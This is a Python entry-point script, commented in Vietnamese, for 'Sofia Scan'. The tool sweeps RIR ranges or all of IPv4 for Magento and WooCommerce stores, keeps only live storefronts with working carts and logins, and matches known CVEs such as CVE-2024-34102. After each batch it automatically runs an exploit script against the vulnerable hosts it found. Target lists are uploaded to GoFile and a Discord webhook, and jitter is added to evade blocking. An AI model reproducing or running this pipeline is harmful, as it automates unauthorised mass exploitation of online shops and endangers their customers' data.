#!/usr/bin/env python3
"""Sofia Scan — entry point.

Điều phối: RIR (sinh targets.txt) → 4 stage (masscan → fingerprint →
versioning → nuclei → resolver) → webhook thông báo mỗi CIDR.
"""
import argparse
import atexit
import copy
import ipaddress
import itertools
import os
import signal
import sys

import yaml

BASE_DIR = os.path.dirname(os.path.abspath(__file__))
sys.path.insert(0, BASE_DIR)

import webhook
from utils import cleanup, file_io, http, ipgen, monitor, rir
from utils.logger import error, info, setup_file_logging, success, warn
from core.pipeline import Pipeline
import upload_live

DEFAULT_CONFIG = {
    "rate": 10000,
    "threads": 50,
    "timeout": 15,
    # Tầng HTTP dùng chung (utils/http.py) — trước đây khối này KHÔNG được nạp
    # (không ai gọi http.configure) nên mọi tham số dưới đây là dead code.
    "http": {
        "user_agent": "Mozilla/5.0 (compatible; SofiaScan/1.0)",
        "retries": 1,            # urllib3 retry transport cho lỗi mạng tạm thời
        "pool_connections": 10,  # số pool TCP giữ trong session thread-local
        "pool_maxsize": 20,      # socket tối đa mỗi pool (≥ threads nếu có thể)
        "verify": False,         # chấp nhận TLS lạ (host scan tự ký)
        "cache_max_entries": 4096,      # PageCache: số trang chủ tối đa
        "cache_max_bytes": 67108864,    # PageCache: 64MB thân tối đa
        "cache_ttl": 300,               # PageCache: TTL giây
        "max_body_bytes": 262144,       # trần đọc thân mỗi request (streaming)
        "max_redirects": 10,            # trần số redirect theo mỗi request
    },
    # Giám sát tài nguyên khi chạy dài (utils/monitor.py)
    "monitor": {
        "enabled": True,
        "interval": 60,        # giây giữa 2 lần log RSS/threads/FD
        "rss_warn_mb": 900,    # RSS vượt → cảnh báo sớm rò rỉ
        "fd_warn": 800,        # số FD vượt → cảnh báo sắp cạn file descriptor
        "nofile": 65535,       # soft limit RLIMIT_NOFILE mong muốn
    },
    # Điều phối pipeline (core/pipeline.py)
    "pipeline": {
        "retry_attempts": 2,   # số lần chạy lại 1 CIDR khi thất bại
        "retry_backoff": 30,   # giây backoff cơ bản (tăng dần theo lần thử)
    },
    # NÂNG CẤP — hook khai thác sau MỖI batch (core/exploit_runner.py):
    #   batch CIDR xong → chạy `sofia/sofia.py -t output/vuln.txt` (đợi xong)
    #   → sang batch kế → lặp lại tới hết targets.
    # sofia.py tự bỏ qua target đã khai thác (ran_target.json / --skip-ran)
    # nên nạp lại cả file vuln.txt mỗi batch cũng không khai thác lại target cũ.
    "exploit": {
        "enabled": True,
        "python": sys.executable or "python3",  # interpreter chạy sofia.py
        "script": "sofia/sofia.py",  # tương đối với thư mục sofia_scan
        "targets_file": "vuln.txt",  # tương đối với output_dir → output/vuln.txt
        "args": [],                  # tham số thêm cho sofia.py, vd ["--threads", "10"]
        "timeout": 0,                # giây chờ tối đa mỗi lần chạy (0 = không giới hạn)
        "min_new_lines": 1,          # chỉ chạy khi có ≥ N dòng MỚI (0 = luôn chạy)
        "log_file": "sofia_exploit.log",  # tương đối output_dir — log sofia.py
    },
    # Stage 1 — engine quét port: masscan | zmap | auto
    "scanner": {
        "engine": "auto",
        "ports": "80,443,8080",
        "masscan": {
            "rate": 10000, "wait": 0,
            "seed": 0, "source_port": "", "source_ip": "", "interface": "",
        },
        "zmap": {
            "rate": 10000, "bandwidth": "", "cooldown": 5,
            "seed": 0, "source_port": "", "interface": "",
            "exclude_file": "", "quiet": True, "dryrun": False,
            "extra_args": [],
        },
        # Tự sinh IPv4 thay vì RIR (xem utils/ipgen.py)
        "generate_ipv4": {
            "enabled": False,
            "cidr": "0.0.0.0/0",
            "split_to": 16,
            "shuffle": True,
            "seed": 0,
            "max_chunks": 0,
        },
        # Chunk CIDR lớn + resume từng chunk + retry/backoff (xem core/scanner.py)
        "chunk_max_hosts": 262144,  # host tối đa mỗi chunk — quyết định prefix mặc định
        "chunk_prefix": 16,         # 0 = tự suy từ chunk_max_hosts (floor /16)
        "retries": 2,               # số lần thử lại engine khi 1 chunk lỗi
        "retry_backoff_base": 15,   # giây nền backoff: base*2^(n-1) + jitter
        "max_scan_seconds": 0,      # 0 = chặn mềm 3600s/lần engine; >0 = --max-time masscan
        "chunk_sleep_min": 0,       # politeness giữa các CHUNK cùng 1 CIDR (giây)
        "chunk_sleep_max": 0,
        "politeness": {             # politeness giữa các CIDR — pipeline ngủ trước CIDR kế
            "sleep_min": 5,
            "sleep_max": 15,
        },
    },
    "cves": ["CVE-2022-24086", "CVE-2024-34102", "CVE-2025-54236"],
    # Stage 2a — nhận diện Magento: probe đa endpoint + điểm tin cậy
    "fingerprint": {
        "endpoints": [
            "/rest/V1/", "/graphql", "/static/version/", "/magento_version",
            # REST công khai + endpoint trả JSON 401 của Magento: bằng chứng mạnh
            # (xem core/fingerprint.py — score_response).
            "/rest/V1/directory/countries", "/rest/V1/store/storeConfigs",
            "/rest/V1/store/storeViews",
        ],
        "min_score": 3,
        "httpx_detect": True,   # chạy httpx (nếu có) SONG SONG trong pool để lọc trước
        "graphql_post": True,   # POST {"query":"{storeConfig{...}}"} khi tín hiệu yếu
    },
    # Stage 2c — lọc "cửa hàng THẬT" (storefront đang mở bán) trong Magento
    # (xem core/store_detect.py): probe storefront + chấm điểm, chỉ cửa hàng
    # thật được đẩy xuống stage 2b-4 → t.txt chứa domain cửa hàng thật.
    "store_detect": {
        "enabled": True,
        "min_score": 3,       # ngưỡng điểm tối thiểu để kết luận cửa hàng thật
        "check_cart": True,   # probe /checkout/cart/ (giỏ hàng hoạt động)
        "check_login": True,  # probe /customer/account/login/ (luồng khách)
        "threads": 20,        # số worker RIÊNG của stage — không tranh fingerprint
        "retries": 1,         # số lần thử lại LỖI MẠNG tạm thời (không retry 429/503)
        "jitter_min": 0.0,    # ngủ ngẫu nhiên (giây) TRƯỚC mỗi URL — chống chặn
        "jitter_max": 0.2,
        "head_limit": 6144,   # byte đầu body + <title> để tìm dấu hiệu "chưa mở bán"
    },
    # Stage 3 — CVE: khớp version offline + nuclei cộng đồng
    "cve": {
        "version_map": "cves/version_map.yaml",
        "nuclei": {
            "enabled": True,          # false = chỉ khớp version offline, không gọi nuclei
            "concurrency": 0,         # nuclei -c (0 = để nuclei tự chọn)
            "rate_limit": 0,          # nuclei -rl gói/giây (0 = không giới hạn)
            "timeout": 15,            # giây chờ mỗi request (rỗng → dùng `timeout` cấp cao)
            "retries": 2,             # nuclei -retries
            "follow_redirects": False,  # true = nuclei theo redirect (mặc định tắt)
            "max_seconds": 7200,      # chặn mềm 1 lượt nuclei (giữ kết quả một phần)
            "local_templates": True,  # chạy template local trong cves/
            "community": True,        # chạy template cộng đồng qua community_ids
            "severity": "",          # chỉ giữ finding mức này trở lên (rỗng = tất cả)
        },
        "community_ids": [
            "CVE-2022-24086", "CVE-2022-24087", "CVE-2024-34102",
            "CVE-2024-45115", "CVE-2025-51362", "CVE-2025-54236",
        ],
    },
    # NHÁNH WOOCOMMERCE/WORDPRESS (xem core/woo_*.py) — chạy song song logic
    # với Magento trên cùng danh sách host: woo_fingerprint phát hiện WordPress/
    # WooCommerce → woo_versioning dò version TỪNG PLUGIN → woo_cve_scan khớp
    # cves/woo_version_map.yaml (offline) + nuclei cộng đồng (-id).
    # enabled=false → bỏ hẳn nhánh woo (chạy như bản cũ, chỉ Magento).
    "woocommerce": {
        "enabled": True,
        "version_map": "cves/woo_version_map.yaml",
        # endpoint probe để chấm điểm WP/Woo (xem core/woo_fingerprint.py)
        "endpoints": [
            "/wp-login.php", "/wp-json/", "/wp-json/wc/store/v1/products",
            "/readme.html", "/cart/", "/shop/",
        ],
        "store_api": "/wp-json/wc/store/",  # Woo Store API — dấu hiệu woo riêng
        "min_score": 3,       # ngưỡng điểm để kết luận WordPress/WooCommerce
        # dò version plugin (xem core/woo_versioning.py): đọc readme.txt khi
        # asset không kèm ?ver; giới hạn số slug xử lý mỗi host
        "fetch_readme": True,
        # đọc /readme.html để lấy version WP core khi thiếu generator meta
        "core_readme": True,
        "max_plugins": 200,
        # slug LUÔN thử đọc readme.txt dù không thấy trong HTML (asset bị gộp/
        # minify vẫn nhận ra WooCommerce + version) — xem woo_versioning.py
        "always_probe_slugs": ["woocommerce"],
        # CVE nuclei cộng đồng cho woo (-id); trống → tự lấy toàn bộ map
        "community_ids": [
            "CVE-2026-47100", "CVE-2023-28121", "CVE-2023-3169",
            "CVE-2024-10820", "CVE-2024-13342", "CVE-2024-13359",
            "CVE-2024-8425", "CVE-2023-33318", "CVE-2025-5746",
            "CVE-2025-6440", "CVE-2024-9289", "CVE-2026-32558",
            "CVE-2024-3957",
        ],
    },
    # Giới hạn sofia.log (xoay vòng): mỗi file tối đa 10MB, giữ 2 backup
    "log": {
        "max_bytes": 10 * 1024 * 1024,
        "backups": 2,
    },
    # Tự động dọn output/ khi quá nặng (utils/cleanup.py):
    #   log_total_mb    — TỔNG dung lượng sofia.log + backups; vượt → xoá backup cũ
    #                     nhất / truncate file chính (handler xoay vòng tự thực hiện)
    #   live_txt_max_mb — output/live.txt vượt → giữ chỉ live_txt_keep_lines dòng
    #                     CUỐI (kết quả gần đây), loại phần cũ
    # 0 / enabled=false → tắt (chạy như bản cũ).
    "cleanup": {
        "enabled": True,
        "log_total_mb": 120,
        "live_txt_max_mb": 512,
        "live_txt_keep_lines": 500000,
    },
    "paths": {
        "targets": "targets.txt",
        "exclude": "config/exclude.txt",
        "targets_extra": "config/targets_extra.txt",
        "output_dir": "output",
    },
    "rir": {
        "sources": {
            "apnic": "https://ftp.apnic.net/stats/apnic/delegated-apnic-extended-latest",
            "ripe": "https://ftp.ripe.net/pub/stats/ripencc/delegated-ripencc-extended-latest",
            "arin": "https://ftp.arin.net/pub/stats/arin/delegated-arin-extended-latest",
            "lacnic": "https://ftp.lacnic.net/pub/stats/lacnic/delegated-lacnic-extended-latest",
            "afrinic": "https://ftp.afrinic.net/pub/stats/afrinic/delegated-afrinic-extended-latest",
        },
        "countries": [],
        "min_prefix": 8,
        "max_prefix": 24,
        "split_to": 24,
    },
    "webhook": {
        "enabled": True,
        "type": "discord",
        "url": "",
        "batch_size": 10,         # gộp gửi khi buffer đủ 10 CIDR (chống spam)
        "flush_interval": 300,    # hoặc tối đa 5 phút nếu có buffer
        "summary_interval": 1800, # tổng quan tiến độ mỗi 30 phút (0 = tắt)
        "quiet": True,            # bỏ qua CIDR 0 domain/0 CVE
    },
    # Upload định kỳ output/t.txt (domain cửa hàng thật) + output/vul.txt (domain
    # dính vuln) lên GoFile + gửi link về webhook — MỖI FILE 1 TIN NHẮN kèm tên
    # file + tên scan (`title`) "kèm theo tên biết bị".
    # CHỈ upload khi ĐỦ 2 ĐIỀU KIỆN: (1) số dòng file thay đổi, (2) đủ interval giây
    # kể từ lần upload thành công gần nhất (state lưu ở output/upload_state.json).
    "upload": {
        "enabled": True,
        "title": "SofiaScan",   # tên scan — hiển thị trên đỉnh webhook
        "files": {               # tên file → mô tả hiển thị trên webhook
            "t.txt": "domain cửa hàng thật",
            "vuln.txt": "domain dính vuln",
        },
        "interval": 15 * 60,    # điều kiện 2 — thời gian TỐI THIỂU giữa 2 lần upload (giây)
        "poll_interval": 60,    # tần suất kiểm tra thay đổi file (giây)
        "count_changed": True,  # điều kiện 1 — chỉ upload khi SỐ dòng file thay đổi
    },
}


def deep_merge(base, override):
    for key, value in (override or {}).items():
        if value and isinstance(value, dict) and isinstance(base.get(key), dict):
            deep_merge(base[key], value)
        else:
            base[key] = value
    return base


def read_extra_targets(cfg):
    """Đọc config/targets_extra.txt — hotspot CIDR ưu tiên quét trước RIR.

    Mỗi dòng: "CIDR" hoặc "CIDR|EXTRA|COUNTRY"; dòng comment "#..." bị bỏ.
    CIDR không hợp lệ bị loại (có cảnh báo), không làm chết pipeline.
    """
    path = cfg["paths"].get("targets_extra")
    if not path or not os.path.exists(path):
        return []
    extra = []
    for line in file_io.read_lines(path):
        parts = [p.strip() for p in line.split("|")]
        cidr = parts[0]
        try:
            ipaddress.ip_network(cidr, strict=False)
        except ValueError:
            warn(f"Bỏ qua CIDR không hợp lệ trong {path}: {cidr}")
            continue
        country = parts[2].upper() if len(parts) > 2 and parts[2] else "XX"
        extra.append((cidr, "extra", country))
    if extra:
        info(f"targets_extra: {len(extra)} hotspot CIDR ưu tiên quét trước")
    return extra


def resolve_paths(cfg):
    for key, value in cfg["paths"].items():
        if not os.path.isabs(value):
            cfg["paths"][key] = os.path.join(BASE_DIR, value)
    return cfg


def load_config(path):
    cfg = copy.deepcopy(DEFAULT_CONFIG)
    if os.path.exists(path):
        with open(path, encoding="utf-8") as fh:
            user_cfg = yaml.safe_load(fh) or {}
        deep_merge(cfg, user_cfg)
    else:
        info(f"Không tìm thấy {path} — dùng cấu hình mặc định")
    return resolve_paths(cfg)


def parse_args():
    ap = argparse.ArgumentParser(description="Sofia Scan — RIR → 4 stage → webhook")
    ap.add_argument("--config", default=os.path.join(BASE_DIR, "config", "config.yaml"))
    ap.add_argument("--countries", help="Lọc quốc gia, ví dụ: VN,TH,ID")
    ap.add_argument("--targets-only", action="store_true",
                    help="Chỉ sinh targets.txt từ RIR rồi thoát")
    ap.add_argument("--no-resume", action="store_true",
                    help="Quét lại cả các CIDR đã hoàn tất")
    ap.add_argument("--rate", type=int, help="Ghi đè rate của masscan/zmap")
    ap.add_argument("--threads", type=int, help="Ghi đè số thread")
    ap.add_argument("--engine", choices=["masscan", "zmap", "auto"],
                    help="Engine stage 1: masscan | zmap | auto (mặc định: config)")
    ap.add_argument("--generate-ipv4", action="store_true",
                    help="Tự sinh dải IPv4 (scanner.generate_ipv4) thay vì RIR")
    ap.add_argument("--gen-cidr", default="",
                    help="Dải gốc cho --generate-ipv4, ví dụ 0.0.0.0/0 (mặc định)")
    ap.add_argument("--split-to", type=int,
                    help="Chia chunk /N cho --generate-ipv4 (mặc định 16)")
    ap.add_argument("--max-chunks", type=int,
                    help="Giới hạn số chunk cho --generate-ipv4 (0 = tất cả, test nhanh)")
    return ap.parse_args()


def _install_termination_handlers():
    """SIGTERM/SIGINT → gửi nốt buffer webhook rồi thoát.

    atexit của webhook KHÔNG chạy khi tiến trình bị SIGTERM (systemd/docker/K8s
    dừng service) hay bị kill — nên đăng ký handler riêng để không mất tin nhắn
    tiến độ cuối và để lại log rõ ràng.
    """

    def _handle(signum, _frame):
        warn(f"Nhận tín hiệu {signum} — flush webhook rồi thoát")
        try:
            webhook.flush()
        except Exception as exc:  # noqa: BLE001 — không để lỗi log làm chết thoát
            warn(f"flush webhook khi thoát lỗi: {exc}")
        try:
            monitor.tick("shutdown", force=True)
        except Exception:  # noqa: BLE001
            pass
        signal.signal(signum, signal.SIG_DFL)
        os.kill(os.getpid(), signum)

    for sig in (signal.SIGTERM, signal.SIGINT):
        try:
            signal.signal(sig, _handle)
        except (ValueError, OSError):
            pass


def main():
    args = parse_args()
    cfg = load_config(args.config)
    if args.rate:
        cfg["rate"] = args.rate
    if args.threads:
        cfg["threads"] = args.threads
    if args.engine:
        cfg.setdefault("scanner", {})["engine"] = args.engine
    if args.countries:
        cfg["rir"]["countries"] = [c.strip().upper() for c in args.countries.split(",") if c.strip()]
    if args.generate_ipv4:
        cfg.setdefault("scanner", {}).setdefault("generate_ipv4", {})["enabled"] = True
    gen = cfg.get("scanner", {}).get("generate_ipv4", {})
    if args.gen_cidr:
        gen["cidr"] = args.gen_cidr
    if args.split_to:
        gen["split_to"] = args.split_to
    if args.max_chunks is not None:
        gen["max_chunks"] = args.max_chunks

    # Nạp tầng HTTP dùng chung (trước đây KHÔNG được gọi → cấu hình `http:` chết),
    # bật monitor tài nguyên và nâng trần file descriptor cho quét dài.
    http.configure(cfg)
    monitor.configure(cfg)
    monitor.raise_nofile()
    _install_termination_handlers()

    output_dir = cfg["paths"]["output_dir"]
    os.makedirs(output_dir, exist_ok=True)
    log_cfg = cfg.get("log") or {}
    cl = cleanup.load(cfg)
    # cleanup.log_total_mb → giới hạn TỔNG dung lượng sofia.log + backups;
    # 0 = tắt (CappedRotatingFileHandler chạy như handler xoay vòng thường)
    cap_bytes = int(cl["log_total_mb"] * 1024 * 1024) if cl["log_total_mb"] > 0 else None
    setup_file_logging(
        os.path.join(output_dir, "sofia.log"),
        max_bytes=log_cfg.get("max_bytes", 10 * 1024 * 1024),
        backup_count=log_cfg.get("backups", 2),
        total_cap_bytes=cap_bytes,
    )

    # Tự động xoá/truncate quá nặng (cleanup.enabled=false → không thao tác)
    try:
        if cl["enabled"]:
            cleanup.enforce_log(os.path.join(output_dir, "sofia.log"), cfg=cfg)
            cleanup.enforce_live(os.path.join(output_dir, "live.txt"), cfg=cfg)
    except Exception as exc:
        warn(f"cleanup startup lỗi: {exc}")

    info("Sofia Scan khởi động")
    upload_live.start_daemon(cfg)  # background: GoFile upload khi ĐỦ 2 điều kiện (số domain đổi + đủ interval)
    if gen.get("enabled"):
        count, targets = ipgen.build_targets(cfg)
        success(f"Tự sinh {count} chunk IPv4 ({gen.get('cidr')} → /{gen.get('split_to')})"
                f" → {cfg['paths']['targets']} — quét cổng {cfg.get('scanner', {}).get('ports', '80,443,8080')}")
    else:
        count, targets = rir.build_targets(cfg)
        success(f"Sinh {count} CIDR sau khi lọc exclude → {cfg['paths']['targets']}")

    # Hotspot: config/targets_extra.txt được đẩy lên đầu hàng đợi quét
    extra = read_extra_targets(cfg)
    if extra:
        targets = itertools.chain(extra, targets)
        count += len(extra)
        info(f"Tổng {count} mục tiêu ({len(extra)} hotspot + phần còn lại)")

    if args.targets_only:
        info("--targets-only: thoát trước khi quét")
        return

    Pipeline(cfg).run(targets, resume=not args.no_resume, total=count)
    monitor.tick("kết thúc", force=True)


if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        error("Dừng bởi người dùng (Ctrl+C)")
        try:
            webhook.flush()  # gửi nốt tin nhắn tiến độ đang buffer
        except Exception:  # noqa: BLE001
            pass
    except Exception as exc:  # noqa: BLE001 — log lỗi cuối + flush trước khi thoát
        error(f"Lỗi không mong đợi: {exc}")
        try:
            webhook.flush()
        except Exception:  # noqa: BLE001
            pass
        raise
















